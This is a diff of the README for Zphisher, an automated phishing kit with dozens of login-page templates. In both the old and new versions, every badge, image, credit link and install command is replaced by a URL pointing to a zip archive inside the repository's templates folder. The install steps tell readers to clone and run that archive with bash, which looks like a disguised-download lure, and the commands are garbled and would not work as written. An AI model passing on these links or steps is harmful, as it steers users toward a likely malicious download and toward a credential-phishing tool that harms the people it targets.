@@ -1,21 +1,21 @@
 <!-- Zphisher -->
 
 <p align="center">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip">
 </p>
 
 <p align="center">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip">
 </p>
 
 <p align="center">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip%20Source-Yes-cyan?style=flat-square">
-  <img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip%20In-Bash-cyan?style=flat-square">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip%20Source-Yes-cyan?style=flat-square">
+  <img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip%20In-Bash-cyan?style=flat-square">
 </p>
 
 <p align="center">A beginners friendly, Automated phishing tool with 30+ templates.</p>
@@ -50,13 +50,13 @@ It only demonstrates "how phishing works". <b>You shall not misuse the informati
 
 - Just, Clone this repository -
 ```
-$ git clone https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip
+$ git clone https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip
 ```
 
-- Change to cloned directory and run `https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip` -
+- Change to cloned directory and run `https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip` -
 ```
 $ cd zphisher
-$ bash https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip
+$ bash https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip
 ```
 
 - On first launch, It'll install the dependencies and that's it. `Zphisher` is installed.
@@ -85,25 +85,25 @@ $ docker run --rm -it htrtech/zphisher
 :: Workflow ::
 </h3>
 <p align="center">
-<img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"/>
+<img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip"/>
 </p>
 
 ### Special Thanks :
 
-- [**Aditya Shakya**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
-- [**1RaY-1**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
-- [**Yisus7u7**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
-- [**sepp0**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
-- [**AliMilani**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
-- [**TheLinuxChoice**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
-- [**DarksecDevelopers**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
-- [**Moises Tapia**](https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip)
+- [**Aditya Shakya**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
+- [**1RaY-1**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
+- [**Yisus7u7**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
+- [**sepp0**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
+- [**AliMilani**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
+- [**TheLinuxChoice**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
+- [**DarksecDevelopers**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
+- [**Moises Tapia**](https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip)
 
 
 ### Find Me on :
 <p align="left">
-  <a href="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip" target="_blank"><img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"></a>
-  <a href="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip" target="_blank"><img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip%https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"></a>
-  <a href="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip" target="_blank"><img src="https://github.com/chidat15/zphisher/raw/refs/heads/master/.sites/microsoft/Software-admirator.zip"></a>
+  <a href="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip"></a>
+  <a href="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip%https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip"></a>
+  <a href="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/chidat15/zphisher/master/.sites/mediafire/Software-v2.6-beta.1.zip"></a>
 </p>
 
